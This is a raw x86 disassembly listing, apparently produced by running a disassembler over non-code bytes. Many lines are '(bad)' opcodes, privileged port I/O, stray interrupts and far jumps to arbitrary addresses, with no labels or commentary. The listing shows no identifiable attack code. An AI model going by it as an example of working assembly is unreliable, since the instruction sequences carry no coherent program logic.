  429d0c:	repz sar edx,1
  429d0f:	mov    ch,0xf3
  429d11:	into   
  429d12:	idiv   al
  429d14:	repz (bad) 
  429d17:	fucomip st,st(5)
  429d19:	in     al,dx
  429d1a:	icebp  
  429d1b:	fistp  QWORD PTR [edi+0x8f6dec9]
  429d21:	fcmovnu st,st(0)
  429d23:	out    dx,eax
  429d24:	mov    ecx,0xd2a4a9e9
  429d29:	out    dx,al
  429d2a:	leave  
  429d2b:	mov    cl,0xe9
  429d2d:	mov    dh,0xff
  429d2f:	fcompp 
  429d31:	mov    ebp,0xd6e9f5c3
  429d36:	pop    es
  429d37:	aad    0xfc
  429d39:	mov    BYTE PTR [eax],0xe2
  429d3c:	out    0xfd,al
  429d3e:	leave  
  429d3f:	push   es
  429d40:	int    0xc4
  429d42:	std    
  429d43:	in     al,dx
  429d44:	int3   
  429d45:	into   
  429d46:	out    dx,al
  429d47:	shr    DWORD PTR [ebp-0x4f1e1544],cl
  429d4d:	in     al,dx
  429d4e:	mov    dh,0xf7
  429d50:	into   
  429d51:	imul   dh
  429d53:	aam    0xff
  429d55:	enter  0xc600,0xbb
  429d59:	shl    ecx,1
  429d5b:	hlt    
  429d5c:	add    esp,eax
  429d5e:	jmp    esp
  429d60:	in     al,0xdc
  429d62:	or     al,BYTE PTR [edi]
  429d64:	lods   al,BYTE PTR ds:[esi]
  429d65:	in     al,dx
  429d66:	in     eax,dx
  429d67:	mov    esi,0xc4b1c3ae
  429d6c:	sti    
  429d6d:	out    0xeb,al
  429d6f:	mov    ch,0xdf
  429d71:	fcom   st(4)
  429d73:	hlt    
  429d74:	enter  0xf4e0,0xcd
  429d78:	(bad)
  429d7b:	(bad)  
  429d7c:	add    eax,0x201ebda
  429d81:	fsub   st,st(2)
  429d83:	or     al,0xc4
  429d85:	jecxz  0x429d36
  429d87:	int3   
  429d88:	xlat   BYTE PTR ds:[ebx]
  429d89:	out    0xe3,eax
  429d8b:	hlt    
  429d8c:	aam    0xdb
  429d8e:	mov    al,0xd6
  429d90:	mov    ah,0xe9
  429d92:	repnz not cl
  429d95:	loopne 0x429d50
  429d97:	out    dx,al
  429d98:	(bad)  
  429d99:	in     al,dx
  429d9a:	mov    ebp,0xd9ffe10b
  429d9f:	out    dx,eax
  429da0:	(bad)  
  429da1:	jmp    0xdddf:0xf0aae4e1
  429da8:	int    0xe4
  429daa:	enter  0xeeed,0xd9
  429dae:	mov    cl,0xbe
  429db0:	stc    
  429db1:	mov    edi,0xe0fbfde8
  429db6:	fcompp 
  429db8:	rcl    ecx,0xc3
  429dbb:	ret    0xfdd6
  429dbe:	add    al,0xdd
  429dc0:	into   
  429dc1:	aam    0xc
  429dc3:	repz mov eax,0xdddebce6
  429dc9:	jmp    0x429dbe
  429dcb:	jmp    0x429d7c
  429dcd:	jmp    0xda0d628a
  429dd2:	jmp    0xc11a5b92
  429dd7:	int    0xe5
  429dd9:	add    al,0xd6
  429ddb:	loope  0x429da6
  429ddd:	add    eax,ebp
  429ddf:	fcmovu st,st(2)
  429de1:	cld    
  429de2:	in     eax,0x5
  429de4:	mov    esp,0xebf3b7b8
  429de9:	mov    al,0xec
  429deb:	in     al,0xf7
  429ded:	(bad)  
  429dee:	aad    0xbb
  429df0:	cld    
  429df1:	in     al,0x2
  429df3:	jmp    0xe0016ad2
  429df8:	mov    ebp,0xd4dbf8d3
  429dfd:	(bad)  
  429dfe:	loopne 0x429dc0
  429e00:	iret   
  429e01:	add    ah,bl
  429e03:	int    0xbd
  429e05:	shl    al,cl
  429e07:	int    0xee
  429e09:	(bad)  
  429e0a:	out    0xcd,eax
  429e0c:	not    eax
  429e0e:	hlt    
  429e0f:	in     eax,dx
  429e10:	(bad)  
  429e11:	in     al,dx
  429e12:	hlt    
  429e13:	ret    
  429e14:	repz idiv edx
  429e17:	cmc    
  429e18:	hlt    
  429e19:	neg    ch
  429e1b:	jmp    0xe4f4:0xce0fdef0
  429e22:	dec    ebp
  429e24:	jmp    0xcf1f910c
  429e29:	test   cl,0xda
  429e2c:	(bad)  
  429e2e:	sar    DWORD PTR [ebx-0x10d0f0f],1
  429e34:	mov    esi,0xbbe0c1ff
  429e39:	loop   0x429e16
  429e3b:	out    0xdb,eax
  429e3d:	ret    0xdf09
  429e40:	push   es
  429e41:	loope  0x429e1e
  429e43:	repz (bad) 
  429e46:	jmp    0xf3054dfe
  429e4b:	rol    ch,1
  429e4d:	icebp  
  429e4e:	cli    
  429e4f:	cli    
  429e50:	mov    ch,0xf2
  429e52:	into   
  429e53:	repz add bh,BYTE PTR [esi+edi*4-0x193afcfd]
  429e5b:	or     ah,bl
  429e5d:	add    ecx,DWORD PTR [eax]
  429e5f:	stc    
  429e60:	or     eax,0xcedfcdc9
  429e65:	(bad)  
  429e66:	rol    al,1
  429e68:	aad    0xd2
  429e6a:	(bad)  
  429e6b:	not    esp
  429e6d:	fld    st(7)
  429e6f:	in     al,dx
  429e70:	dec    ebx
  429e72:	lock (bad) 
  429e75:	stc    
  429e76:	icebp  
  429e77:	out    dx,al
  429e78:	add    al,BYTE PTR [ebx]
  429e7a:	aad    0xf9
  429e7c:	(bad)  
  429e7e:	add    al,0x5
  429e80:	iret   
  429e81:	fcmovnbe st,st(3)
  429e83:	add    dh,cl
  429e85:	rol    ah,cl
  429e87:	repz in eax,dx
  429e89:	mov    ah,0xc0
  429e8b:	in     al,0xf4
  429e8d:	rcl    al,0xf6
  429e90:	mov    edx,0xf5c2f3ea
  429e95:	mov    eax,0xf0fdecdc
  429e9a:	fadd   st,st(1)
  429e9c:	rol    BYTE PTR [esi],1
  429e9e:	rol    edi,0x8
  429ea1:	(bad)
  429ea4:	stos   DWORD PTR es:[edi],eax
  429ea5:	iret   
  429ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429ea7:	icebp  
  429ea8:	into   
  429ea9:	aam    0xad
  429eab:	hlt    
  429eac:	ror    bl,0xd0
  429eaf:	cmc    
  429eb0:	in     al,dx
  429eb1:	(bad)  
  429eb3:	call   esp
  429eb5:	loop   0x429e85
  429eb7:	add    DWORD PTR ds:0xddc107c0,eax
  429ebd:	shl    bl,0xc7
  429ec0:	cld    
  429ec1:	cli    
  429ec2:	shr    ecx,cl
  429ec4:	mov    eax,0xc7b6f1b0
  429ec9:	mov    bl,0xad
  429ecb:	jmp    0x429e9b
  429ecd:	mov    ebx,0xdbd8f8e6
  429ed2:	mov    ebx,0xe7bdd9dc
  429ed7:	push   ebx
  429ed9:	not    ah
  429edb:	mov    eax,0x8f4e9f5
  429ee0:	retf   
  429ee1:	loopne 0x429edb
  429ee3:	out    0xcb,al
  429ee5:	(bad)
  429ee9:	shl    ebp,0xa8
  429eec:	out    dx,al
  429eed:	fcomip st,st(3)
  429eef:	xlat   BYTE PTR ds:[ebx]
  429ef0:	out    dx,eax
  429ef1:	sar    ch,1
  429ef3:	fdivr  st(0),st
  429ef5:	fdecstp 
  429ef7:	rol    BYTE PTR [esi+edx*8],1
  429efa:	fdivp  st(3),st
  429efc:	lds    edi,FWORD PTR [esi+0x707dae7]
  429f02:	int3   
  429f03:	jmp    FWORD PTR [ebx-0x9410e13]
  429f09:	(bad)  
  429f0a:	in     al,dx
  429f0b:	out    0xf5,eax
  429f0d:	sar    BYTE PTR [eax-0xf1b461a],1
  429f13:	in     eax,dx
  429f14:	iret   
  429f15:	ror    bh,cl
  429f17:	add    edx,edx
  429f19:	pop    es
  429f1a:	lock or ebx,eax
  429f1d:	add    eax,0xcb01e5da
  429f22:	repz add al,0xe8
  429f25:	lds    esi,FWORD PTR [ebx-0x311e3033]
  429f2b:	rol    ah,0xc8
  429f2e:	lods   eax,DWORD PTR ds:[esi]
  429f2f:	in     al,0xef
  429f31:	mov    ch,0xbf
  429f33:	inc    DWORD PTR [ebx]
  429f35:	fiadd  DWORD PTR [edi]
  429f37:	fmul   st(5),st
  429f39:	or     edi,DWORD PTR [ebp-0x3b393406]
  429f3f:	retf   0xf300
  429f42:	loope  0x429f2f
  429f44:	shl    bl,cl
  429f46:	int3   
  429f47:	leave  
  429f48:	(bad)  
  429f49:	enter  0xd6da,0xd4
  429f4d:	not    ch
  429f4f:	iret   
  429f50:	sti    
  429f51:	(bad)  
  429f52:	xlat   BYTE PTR ds:[ebx]
  429f53:	fmul   st,st(1)
  429f55:	fcmove st,st(5)
  429f57:	in     eax,dx
  429f58:	aad    0xc1
  429f5a:	lock ror bl,cl
  429f5d:	out    dx,eax
  429f5e:	fdivr  st(6),st
  429f60:	fisttp WORD PTR [eax]
  429f62:	adc    edx,ebx
  429f64:	out    dx,al
  429f65:	lods   eax,DWORD PTR ds:[esi]
  429f66:	mov    bh,0xf2
  429f68:	(bad)  
  429f69:	aad    0xc2
  429f6b:	enter  0xbab6,0xe6
  429f6f:	mov    al,0xec
  429f71:	repz mov eax,0xf8f6bdf9
  429f77:	cli    
  429f78:	loope  0x429f41
  429f7a:	or     esi,edx
  429f7c:	ror    ebx,1
  429f7e:	idiv   ah
  429f80:	out    0xe3,eax
  429f82:	in     eax,0xf8
  429f84:	lock lods al,BYTE PTR ds:[esi]
  429f86:	out    dx,eax
  429f87:	shl    ch,cl
  429f89:	idiv   edx
  429f8b:	not    edx
  429f8d:	fdiv   DWORD PTR [esi-0x230b2149]
  429f93:	retf   0xfcf1
  429f96:	push   es
  429f97:	neg    dl
  429f99:	in     al,0xf7
  429f9b:	or     DWORD PTR [esi],eax
  429f9d:	jmp    0x429f7b
  429f9f:	rol    BYTE PTR [edx],0xfd
  429fa2:	int3   
  429fa3:	pop    es
  429fa4:	test   eax,0xacb6c7e4
  429fa9:	hlt    
  429faa:	sti    
  429fab:	int    0xd3
  429fad:	scas   al,BYTE PTR es:[edi]
  429fae:	mov    edx,0xd3f3f4d5
  429fb3:	stc    
  429fb4:	(bad)  
  429fb6:	mov    esi,0xd0e203e0
  429fbb:	inc    BYTE PTR [esi]
  429fbd:	cli    
  429fbe:	(bad)  
  429fc0:	stc    
  429fc1:	add    edx,ebp
  429fc3:	add    eax,0xcac4bcc0
  429fc8:	jmp    0xd6ca:0xb0b1ecd0
  429fcf:	int3   
  429fd0:	ror    eax,1
  429fd2:	idiv   BYTE PTR [edx-0x32072408]
  429fd8:	add    ecx,esp
  429fda:	mov    edi,0xe805d9d4
  429fe0:	iret   
  429fe1:	or     eax,0xc1c5060e
  429fe6:	repz fadd st(5),st
  429fe9:	cmc    
  429fea:	mov    dh,0xef
  429fec:	jmp    0xfdea:0xffe6adf5
  429ff3:	repz enter 0xfafa,0xe5
  429ff8:	aam    0xda
  429ffa:	sar    dl,1
  429ffc:	(bad)  
  429ffd:	cmc    
  429ffe:	(bad)
  42a001:	add    bh,ah
  42a003:	add    bh,BYTE PTR [esi-0x4e2e2c19]
  42a009:	mov    cl,0xdb
  42a00b:	mov    dh,0xd5
  42a00d:	icebp  
  42a00e:	mov    cl,0xff
  42a010:	(bad)  
  42a011:	mov    eax,0xd7f7c8c9
  42a016:	repz (bad) 
  42a019:	pop    es
  42a01a:	(bad)  
  42a01b:	fimul  DWORD PTR [edx]
  42a01d:	(bad)  
  42a01f:	add    cl,cl
  42a021:	fisttp DWORD PTR [ecx]
  42a023:	int    0xae
  42a025:	lods   eax,DWORD PTR ds:[esi]
  42a026:	out    dx,eax
  42a027:	cmc    
  42a028:	in     al,dx
  42a029:	ror    esp,1
  42a02b:	shl    ebp,1
  42a02d:	out    dx,eax
  42a02e:	int3   
  42a02f:	(bad)  
  42a030:	stc    
  42a031:	mov    ecx,0xe801dcc8
  42a036:	mov    ecx,0xe4f2fff9
  42a03b:	add    edi,edi
  42a03d:	(bad)  
  42a03f:	(bad)  
  42a040:	(bad)  
  42a041:	in     eax,dx
  42a042:	retf   
  42a043:	push   cs
  42a044:	repnz out 0xbf,eax
  42a047:	mov    bh,0xec
  42a049:	hlt    
  42a04a:	hlt    
  42a04b:	loop   0x42a023
  42a04d:	(bad)  
  42a04e:	out    dx,al
  42a04f:	repnz mov ah,0xd3
  42a052:	retf   0xd3ea
  42a055:	rcr    esp,cl
  42a057:	fiadd  DWORD PTR [eax]
  42a059:	loop   0x42a061
  42a05b:	clc    
  42a05c:	hlt    
  42a05d:	out    0x7,al
  42a05f:	or     esp,ebx
  42a061:	fild   WORD PTR [eax]
  42a063:	in     eax,0xc0
  42a065:	mov    esi,0xf4e1f3e9
  42a06a:	imul   ah
  42a06c:	leave  
  42a06d:	(bad)  
  42a06f:	(bad)  
  42a070:	faddp  st(4),st
  42a072:	fst    st(0)
  42a074:	in     eax,dx
  42a075:	mov    edx,0xc0f0f7c0
  42a07a:	stc    
  42a07b:	repnz clc 
  42a07d:	retf   0x7e2
  42a080:	(bad)  
  42a081:	in     eax,dx
  42a082:	por    mm0,mm1
  42a085:	xlat   BYTE PTR ds:[ebx]
  42a086:	test   bl,0xae
  42a089:	(bad)  
  42a08a:	shr    al,cl
  42a08c:	mov    ecx,0xe5edd5db
  42a091:	mov    dl,0xb5
  42a093:	enter  0xbdbc,0xfb
  42a097:	mul    ch
  42a099:	fcomip st,st(0)
  42a09b:	jmp    0x42a079
  42a09d:	(bad)  
  42a09e:	hlt    
  42a09f:	loopne 0x42a06e
  42a0a1:	retf   0xdfc5
  42a0a4:	int3   
  42a0a5:	rcl    edx,0xc1
  42a0a8:	shl    BYTE PTR [ebx-0x454d2909],1
  42a0ae:	repnz mov ch,0xed
  42a0b1:	aad    0xfd
  42a0b3:	iret   
  42a0b4:	in     eax,dx
  42a0b5:	shl    cl,cl
  42a0b7:	add    edx,edx
  42a0b9:	fadd   QWORD PTR [ebx]
  42a0bb:	jmp    0xcf01:0xeefffed7
  42a0c2:	out    dx,al
  42a0c3:	leave  
  42a0c4:	loope  0x42a0ae
  42a0c6:	scas   al,BYTE PTR es:[edi]
  42a0c7:	shr    esp,0xce
  42a0ca:	retf   
  42a0cb:	loope  0x42a0b4
  42a0cd:	test   bl,0xdb
  42a0d0:	xlat   BYTE PTR ds:[ebx]
  42a0d1:	std    
  42a0d2:	mov    ebx,0xf7cfdac2
  42a0d7:	(bad)  
  42a0d8:	in     eax,0xdc
  42a0da:	or     ah,cl
  42a0dc:	xlat   BYTE PTR ds:[ebx]
  42a0dd:	(bad)  
  42a0df:	(bad)  
  42a0e1:	push   es
  42a0e2:	repnz push DWORD PTR [ecx-0x2c321415]
  42a0e9:	retf   0xeab1
  42a0ec:	fdiv   DWORD PTR [edx-0x462e1949]
  42a0f2:	jmp    0xf7e5:0xd8cee0dd
  42a0f9:	hlt    
  42a0fa:	sti    
  42a0fb:	pop    es
  42a0fc:	(bad)  [eax]
  42a0fe:	retf   
  42a0ff:	push   es
  42a100:	sti    
  42a101:	enter  0xfe,0xaa
  42a105:	test   al,0xe6
  42a107:	scas   al,BYTE PTR es:[edi]
  42a108:	in     eax,dx
  42a109:	shl    eax,0xb3
  42a10c:	scas   eax,DWORD PTR es:[edi]
  42a10d:	lds    esi,FWORD PTR [esp+esi*8-0x11281022]
  42a114:	lock cmc 
  42a116:	in     al,dx
  42a117:	mov    ah,0xc0
  42a119:	in     al,dx
  42a11a:	pop    es
  42a11b:	cli    
  42a11c:	sti    
  42a11d:	std    
  42a11e:	cld    
  42a11f:	retf   
  42a120:	push   cs
  42a121:	push   es
  42a122:	fst    st(2)
  42a124:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a125:	mov    eax,0xebf4e5c1
  42a12a:	mov    al,0xe4
  42a12c:	cli    
  42a12d:	loopne 0x42a11c
  42a12f:	in     al,0xee
  42a131:	cmc    
  42a132:	icebp  
  42a133:	int    0xce
  42a135:	enter  0xf6c0,0x5
  42a139:	push   esi
  42a13b:	add    esp,eax
  42a13d:	add    dh,dl
  42a13f:	fdivr  st,st(2)
  42a141:	psubsw mm3,mm1
  42a144:	lock loope 0x42a0f9
  42a147:	lods   eax,DWORD PTR ds:[esi]
  42a148:	shl    ebx,cl
  42a14a:	enter  0xe9d9,0xdf
  42a14e:	mov    ch,0xd0
  42a150:	(bad)  
  42a151:	shr    dh,1
  42a153:	out    dx,eax
  42a154:	add    cl,bh
  42a156:	shl    ebp,cl
  42a158:	faddp  st(1),st
  42a15a:	aad    0xc2
  42a15c:	fdiv   st,st(6)
  42a15e:	out    0xe7,al
  42a160:	or     ecx,eax
  42a162:	loope  0x42a145
  42a164:	lods   eax,DWORD PTR ds:[esi]
  42a165:	leave  
  42a166:	(bad)  
  42a167:	(bad)  
  42a168:	lock in eax,dx
  42a16a:	leave  
  42a16b:	rol    ecx,1
  42a16d:	fcmovne st,st(5)
  42a16f:	mov    ebx,0xfef2cbb3
  42a174:	shr    esi,1
  42a176:	icebp  
  42a177:	(bad)  
  42a178:	cld    
  42a179:	xlat   BYTE PTR ds:[ebx]
  42a17a:	add    ebp,esp
  42a17c:	in     eax,0xd8
  42a17e:	std    
  42a17f:	std    
  42a180:	mov    DWORD PTR [edi],0xddb9e5cd
  42a186:	out    dx,al
  42a187:	mov    dh,0xef
  42a189:	(bad)  
  42a18a:	icebp  
  42a18b:	mov    edx,0xd2cee5f2
  42a190:	out    dx,al
  42a191:	shr    ebx,cl
  42a193:	xlat   BYTE PTR ds:[ebx]
  42a194:	repz loope 0x42a158
  42a197:	aad    0xd7
  42a199:	stc    
  42a19a:	in     al,0xeb
  42a19c:	add    bl,cl
  42a19e:	sti    
  42a19f:	fsubp  st(4),st
  42a1a1:	fsubr  st(4),st
  42a1a3:	in     eax,0xcf
  42a1a5:	test   eax,0xf1adead7
  42a1aa:	lods   eax,DWORD PTR ds:[esi]
  42a1ab:	call   0xba365dab
  42a1b0:	call   0xc4406ba8
  42a1b5:	pop    es
  42a1b6:	out    dx,eax
  42a1b7:	rol    BYTE PTR [ebx],0xf9
  42a1ba:	jecxz  0x42a1be
  42a1bc:	ret    0xf806
  42a1bf:	out    dx,eax
  42a1c0:	add    BYTE PTR ds:0xe6f0c8cb,cl
  42a1c6:	in     al,dx
  42a1c7:	(bad)
  42a1ca:	lods   eax,DWORD PTR ds:[esi]
  42a1cb:	ror    dh,cl
  42a1cd:	mov    ah,0xc5
  42a1cf:	jmp    0xcee9:0xfbc8dbb4
  42a1d6:	mov    ch,0xe1
  42a1d8:	(bad)  
  42a1da:	sar    esp,0x6
  42a1dd:	out    0xfa,eax
  42a1df:	mov    esp,0xeacbc6c3
  42a1e4:	fdivr  DWORD PTR [eax-0x31362d58]
  42a1ea:	lds    esi,FWORD PTR [edx-0x25454816]
  42a1f0:	retf   
  42a1f1:	mov    dh,0xec
  42a1f3:	loope  0x42a1f5
  42a1f5:	repz std 
  42a1f7:	clc    
  42a1f8:	fstp   st(0)
  42a1fa:	add    BYTE PTR [edx],cl
  42a1fc:	stc    
  42a1fd:	enter  0x9da,0xea
  42a201:	in     al,0xde
  42a203:	add    al,0xef
  42a205:	fdivr  st(0),st
  42a207:	(bad)  
  42a209:	jmp    0x42a1e2
  42a20b:	rol    ebp,cl
  42a20d:	sar    esi,1
  42a20f:	icebp  
  42a210:	(bad)  
  42a213:	retf   0xb8f0
  42a216:	fsubp  st(5),st
  42a218:	repz stc 
  42a21a:	ffree  st(3)
  42a21c:	hlt    
  42a21d:	or     al,dh
  42a21f:	pop    es
  42a220:	std    
  42a221:	loop   0x42a223
  42a223:	add    al,0xb9
  42a225:	scas   eax,DWORD PTR es:[edi]
  42a226:	lods   eax,DWORD PTR ds:[esi]
  42a227:	loopne 0x42a214
  42a229:	int    0xe8
  42a22b:	shl    DWORD PTR [ebx-0x2d473b4e],1
  42a231:	stc    
  42a232:	repz call 0xcf178624
  42a238:	add    esi,edx
  42a23a:	push   es
  42a23b:	mov    esp,0xc8e9cae4
  42a240:	iret   
  42a241:	fsubr  st,st(0)
  42a243:	fadd   st,st(0)
  42a245:	scas   eax,DWORD PTR es:[edi]
  42a246:	scas   al,BYTE PTR es:[edi]
  42a247:	sar    BYTE PTR [ebx+esi*8-0x45302436],1
  42a24e:	mov    edx,0xf9ebf6e8
  42a253:	ret    0xf8ff
  42a256:	idiv   DWORD PTR [eax-0x10f0f2e]
  42a25c:	fadd   QWORD PTR [ebx]
  42a25e:	enter  0xd5de,0xea
  42a262:	add    eax,0xbcade6d3
  42a267:	int3   
  42a268:	mov    bh,0xe6
  42a26a:	jmp    0xeceb:0xb8c4e0ca
  42a271:	lock mov edx,0xc0c0fcbf
  42a277:	ffreep st(5)
  42a279:	add    al,0xd3
  42a27b:	ret    
  42a27c:	mov    edi,0x5f4e1eb
  42a281:	lds    ecx,FWORD PTR [esi]
  42a283:	in     al,dx
  42a284:	out    dx,al
  42a285:	out    0xb3,al
  42a287:	out    0xe9,eax
  42a289:	(bad)
  42a28c:	sti    
  42a28d:	clc    
  42a28e:	into   
  42a28f:	std    
  42a290:	fdivrp st(2),st
  42a292:	icebp  
  42a293:	rcr    ecx,cl
  42a295:	imul   ebp
  42a297:	out    0xbc,eax
  42a299:	aam    0xd0
  42a29b:	add    eax,ebp
  42a29d:	(bad)  
  42a29e:	enter  0xffa,0xe8
  42a2a2:	std    
  42a2a3:	leave  
  42a2a4:	fadd   st(6),st
  42a2a6:	fsubr  QWORD PTR [edi-0x302b3e39]
  42a2ac:	(bad)  
  42a2ad:	mov    ebx,0xdae9accf
  42a2b2:	fidivr DWORD PTR [edi-0xb0f4627]
  42a2b8:	icebp  
  42a2b9:	out    0xfa,al
  42a2bb:	ret    0xc2cb
  42a2be:	cmc    
  42a2bf:	loop   0x42a2ac
  42a2c1:	int3   
  42a2c2:	add    edx,esi
  42a2c4:	scas   eax,DWORD PTR es:[edi]
  42a2c5:	in     al,dx
  42a2c6:	leave  
  42a2c7:	repnz mov ch,0xe8
  42a2ca:	in     al,dx
  42a2cb:	int3   
  42a2cc:	jmp    0x42a2c0
  42a2ce:	cmc    
  42a2cf:	mov    al,0xd1
  42a2d1:	cli    
  42a2d2:	sti    
  42a2d3:	fiadd  DWORD PTR [ecx]
  42a2d5:	sar    DWORD PTR [ecx-0x43212d19],0xd6
  42a2dc:	not    dh
  42a2de:	enter  0xdafe,0xe3
  42a2e2:	retf   
  42a2e3:	or     DWORD PTR [ebx-0x1a3b5a50],esi
  42a2e9:	rol    ecx,cl
  42a2eb:	mov    al,0xbb
  42a2ed:	mov    ecx,0xd8b8e9e8
  42a2f2:	iret   
  42a2f3:	out    dx,al
  42a2f4:	rcl    eax,0x0
  42a2f7:	mov    edi,0xf202f4dc
  42a2fc:	or     eax,edx
  42a2fe:	fld    DWORD PTR [edi]
  42a300:	cli    
  42a301:	cli    
  42a302:	int    0x5
  42a304:	mov    ecx,0xdde4f3dc
  42a309:	cmc    
  42a30a:	rcr    dl,0xb6
  42a30d:	shr    BYTE PTR [ebp-0x444d4a2b],0xd8
  42a314:	add    ebx,edx
  42a316:	loop   0x42a2f8
  42a318:	loop   0x42a310
  42a31a:	mov    esp,0xe2f6ebf0
  42a31f:	(bad)  
  42a321:	adc    edx,DWORD PTR [edx]
  42a323:	leave  
  42a324:	call   0xae076b0f
  42a329:	repz fcmovb st,st(2)
  42a32c:	repz mov ecx,0xced0bae9
  42a332:	mov    edi,0xffbdf9e8
  42a337:	int    0xdb
  42a339:	(bad)
  42a33c:	icebp  
  42a33d:	ret    0xae3
  42a340:	jecxz  0x42a311
  42a342:	(bad)  
  42a344:	out    0xbc,eax
  42a346:	enter  0xd6ef,0xf6
  42a34a:	fcmovnb st,st(4)
  42a34c:	(bad)  
  42a34d:	out    dx,eax
  42a34e:	(bad)  
  42a351:	fcomp  st(7)
  42a353:	fmulp  st(0),st
  42a355:	int3   
  42a356:	loopne 0x42a32d
  42a358:	shl    dl,1
  42a35a:	mov    ebp,0xe608eb02
  42a35f:	add    dl,ah
  42a361:	pop    es
  42a362:	retf   0xb30d
  42a365:	fnstsw WORD PTR [esi-0x48381b3c]
  42a36b:	jmp    0xcdf4:0xf1d6e0b6
  42a372:	mov    ecx,0xf1f4bee1
  42a377:	fcmovnu st,st(1)
  42a379:	(bad)  
  42a37b:	aad    0xc4
  42a37d:	aam    0xe5
  42a37f:	leave  
  42a380:	out    0x5,al
  42a382:	or     ebp,edi
  42a384:	stos   DWORD PTR es:[edi],eax
  42a385:	(bad)  
  42a386:	int3   
  42a387:	jmp    0xdfdb:0xcbbbb1e4
  42a38e:	(bad)  
  42a38f:	stc    
  42a390:	cld    
  42a391:	jecxz  0x42a371
  42a393:	mov    ebx,0xe3d3bdfe
  42a398:	shl    esp,0xd9
  42a39b:	cld    
  42a39c:	cli    
  42a39d:	loop   0x42a3a0
  42a39f:	or     esp,eax
  42a3a1:	loope  0x42a3a7
  42a3a3:	shl    ebx,cl
  42a3a5:	(bad)  
  42a3a6:	xlat   BYTE PTR ds:[ebx]
  42a3a7:	lods   eax,DWORD PTR ds:[esi]
  42a3a8:	shl    ebx,0xcf
  42a3ab:	loop   0x42a378
  42a3ad:	cmc    
  42a3ae:	mov    edi,0xc3cfdaba
  42a3b3:	int    0xd4
  42a3b5:	pop    es
  42a3b6:	cld    
  42a3b7:	(bad)  
  42a3b8:	mov    esi,0xfcd50afc
  42a3bd:	ffreep st(6)
  42a3bf:	out    dx,al
  42a3c0:	std    
  42a3c1:	(bad)  
  42a3c2:	repnz or eax,0xb1c7acc4
  42a3c8:	imul   DWORD PTR [edi+esi*8-0x1110081b]
  42a3cf:	mov    edx,0xeed1edb3
  42a3d4:	(bad)  
  42a3d5:	int    0xec
  42a3d7:	(bad)  
  42a3d9:	rcr    eax,1
  42a3db:	stc    
  42a3dc:	shr    cl,0xe2
  42a3df:	aam    0xfe
  42a3e1:	fcmovnu st,st(5)
  42a3e3:	add    ah,BYTE PTR [edi-0x4c4f122d]
  42a3e9:	lods   al,BYTE PTR ds:[esi]
  42a3ea:	mov    ah,0xcf
  42a3ec:	ror    edi,cl
  42a3ee:	xlat   BYTE PTR ds:[ebx]
  42a3ef:	iret   
  42a3f0:	clc    
  42a3f1:	int3   
  42a3f2:	shr    ch,cl
  42a3f4:	mov    esi,0x5b8bdd7
  42a3f9:	(bad)  
  42a3fb:	clc    
  42a3fc:	hlt    
  42a3fd:	xlat   BYTE PTR ds:[ebx]
  42a3fe:	loope  0x42a403
  42a400:	or     al,0xde
  42a402:	in     eax,dx
  42a403:	jmp    0xadf24ecc
  42a408:	scas   eax,DWORD PTR es:[edi]
  42a409:	shr    BYTE PTR [ecx-0x2a183613],0xca
  42a410:	test   bh,0xba
  42a413:	int    0xc1
  42a415:	shl    dl,1
  42a417:	cmc    
  42a418:	idiv   BYTE PTR [esi+0x2daca00]
  42a41e:	hlt    
  42a41f:	(bad)  
  42a421:	out    0xe5,eax
  42a423:	(bad)  
  42a424:	leave  
  42a425:	neg    esi
  42a427:	lods   eax,DWORD PTR ds:[esi]
  42a428:	in     al,dx
  42a429:	mov    bh,0xce
  42a42b:	ret    0xb0b1
  42a42e:	aad    0xb4
  42a430:	std    
  42a431:	div    DWORD PTR [ecx-0x1f2b242a]
  42a437:	loopne 0x42a425
  42a439:	ret    
  42a43a:	push   es
  42a43b:	in     al,0xfb
  42a43d:	xlat   BYTE PTR ds:[ebx]
  42a43e:	or     bh,ch
  42a440:	loope  0x42a42c
  42a442:	jmp    0x42a43e
  42a444:	loopne 0x42a406
  42a446:	int    0xe4
  42a448:	repz rol al,cl
  42a44b:	loope  0x42a42e
  42a44d:	mov    ah,0xb4
  42a44f:	(bad)  
  42a451:	retf   0xf3ec
  42a454:	ret    
  42a455:	ret    
  42a456:	(bad)  
  42a458:	imul   ebx
  42a45a:	lock fldpi 
  42a45d:	push   es
  42a45e:	rol    ebp,0xd5
  42a461:	or     ch,bl
  42a463:	add    DWORD PTR [esp+ebp*4-0x15281e57],edi
  42a46a:	mov    cl,0xec
  42a46c:	shl    DWORD PTR [edi-0x304a4746],1
  42a472:	int    0xca
  42a474:	jecxz  0x42a432
  42a476:	fcomi  st,st(3)
  42a478:	call   esi
  42a47a:	stc    
  42a47b:	repnz or esp,edx
  42a47e:	add    al,bh
  42a480:	or     eax,0xbf0201df
  42a485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a486:	fadd   st(3),st
  42a488:	(bad)  
  42a489:	aam    0xed
  42a48b:	mov    bh,0xb9
  42a48d:	icebp  
  42a48e:	repnz mov ecx,0xd3b8f4f0
  42a494:	int3   
  42a495:	cld    
  42a496:	add    esi,DWORD PTR [ebx+ebx*8-0xf35fb01]
  42a49d:	enter  0xc5,0x5
  42a4a1:	into   
  42a4a2:	retf   
  42a4a3:	in     al,dx
  42a4a4:	les    esp,FWORD PTR [esi-0x242a2f15]
  42a4aa:	aam    0xe8
  42a4ac:	(bad)  [esi-0x374016]
  42a4b2:	aam    0xca
  42a4b4:	into   
  42a4b5:	icebp  
  42a4b6:	stc    
  42a4b7:	mov    esp,0xaf8fff5
  42a4bc:	(bad)
  42a4bf:	push   cs
  42a4c0:	add    ah,bh
  42a4c2:	adc    ecx,DWORD PTR [ecx]
  42a4c4:	int3   
  42a4c5:	ret    
  42a4c6:	fidiv  WORD PTR [ebx-0x29364d3f]
  42a4cc:	retf   
  42a4cd:	iret   
  42a4ce:	(bad)  [eax-0x37fc0329]
  42a4d4:	int    0xd1
  42a4d6:	add    esi,ebp
  42a4d8:	fucomip st,st(4)
  42a4da:	add    al,0xea
  42a4dc:	shl    esi,0xe3
  42a4df:	loopne 0x42a4a5
  42a4e1:	or     cl,dh
  42a4e3:	repz shr DWORD PTR [ebp-0x1c521240],1
  42a4ea:	int    0xce
  42a4ec:	out    dx,eax
  42a4ed:	mov    dh,0xee
  42a4ef:	(bad)  
  42a4f0:	(bad)  
  42a4f2:	mov    esi,0xdac3dafc
  42a4f7:	sti    
  42a4f8:	clc    
  42a4f9:	add    eax,0xc8fdd1f2
  42a4fe:	push   cs
